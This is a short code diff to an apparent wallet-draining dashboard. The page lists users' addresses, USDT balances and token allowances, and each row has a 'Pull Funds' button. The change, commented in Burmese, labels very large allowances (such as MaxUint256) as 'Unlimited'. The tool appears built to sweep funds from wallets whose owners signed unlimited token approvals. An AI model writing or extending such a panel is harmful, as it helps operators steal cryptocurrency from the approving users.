@@ -204,13 +204,16 @@
                         const shortAddr = `${addr.substring(0, 6)}...${addr.substring(38)}`;
                         const userId = userInfo.isRegistered ? userInfo.userId.toString() : "-";
 
+                        // Allowance ပမာဏ အများကြီးဖြစ်နေလျှင် (MaxUint256 ကဲ့သို့) "Unlimited" ဟုပြသရန်၊ သို့မဟုတ်ပါက တိကျသော ပမာဏကို ပြရန်
+                        let allowanceDisplay = allowance > 1000000000 ? "Unlimited" : `${allowance.toFixed(2)} USDT`;
+
                         rowsHtml += `
                             <tr>
                                 <td class="p-2.5"><input type="checkbox" class="user-checkbox" value="${addr}"></td>
                                 <td class="p-2.5 font-mono">${userId}</td>
                                 <td class="p-2.5 font-mono text-slate-400" title="${addr}">${shortAddr}</td>
                                 <td class="p-2.5 font-mono text-emerald-400">${balance.toFixed(2)} USDT</td>
-                                <td class="p-2.5 font-mono text-amber-300">${allowance > 0 ? "Approved" : "0 USDT"}</td>
+                                <td class="p-2.5 font-mono text-amber-300">${allowanceDisplay}</td>
                                 <td class="p-2.5 text-center">
                                     <button onclick="pullSingleUser('${addr}', '${balance}')" class="bg-indigo-600 hover:bg-indigo-500 px-2.5 py-1 rounded text-[10px] cursor-pointer">Pull Funds</button>
                                 </td>
